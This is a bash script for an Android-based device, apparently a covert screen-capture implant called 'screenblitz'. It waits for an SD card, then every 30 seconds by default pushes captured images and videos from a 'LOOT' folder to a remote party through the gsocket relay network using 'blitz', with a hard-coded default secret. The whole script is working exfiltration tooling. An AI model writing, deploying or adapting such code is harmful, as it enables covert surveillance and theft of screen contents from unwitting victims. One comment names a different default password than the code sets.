#!/system/bin/bash

sync_folder(){
    # List all open files in /mnt/media_rw/<SD-card-name>/LOOT
    OPEN_FILES=$(mktemp)
    /system/bin/lsof | grep -oE "$2[^[:space:]]+" > "$OPEN_FILES"

    # blitz all closed files from the LOOT directory
    /system/bin/bash blitz -s "$1" -o "RSOPT=--exclude-from=$OPEN_FILES" "$2./"

    rm "$OPEN_FILES" 
}

# Wait for the SD-card to be mounted
while [ -z  "$(/system/bin/ls /mnt/media_rw)" ]; do
    /system/bin/sleep 5
done

# Location of the captured images/videos
LOOTDIR="/mnt/media_rw/$(/system/bin/ls /mnt/media_rw)/LOOT/"

# Check if a .env file is present
if [ ! -f "/system/screenblitz/.env" ]; then
    echo -e "\e[31m[ERROR] - No .env file found in /system/screenblitz\e[0m"
    exit 1
fi

# Load the configuration from .env
source "/system/screenblitz/.env"

# Check if GSOCKET_IP is set - otherwise leave blank (i.e use the Global Socket Relay Network)
if [ -n "$GSOCKET_IP" ]; then
    export GSOCKET_IP="${GSOCKET_IP#*=}"
fi

# Check if TIMEOUT is set - otherwise default to 30 second
if [ -n "$TIMEOUT" ]; then
    export TIMEOUT="${TIMEOUT#=}"
else
    export TIMEOUT=30
fi

# Check if SECRET is set - otherwise use 'screencrab' as default password

if [ -n "$SECRET" ]; then
    export SECRET="${SECRET#=*}"
else
    export SECRET="screenblitz"
fi

# Start to blitz the files every $TIMEOUT seconds
while true; do
    sync_folder "$SECRET" "$LOOTDIR"
    /system/bin/sleep "$TIMEOUT"
done






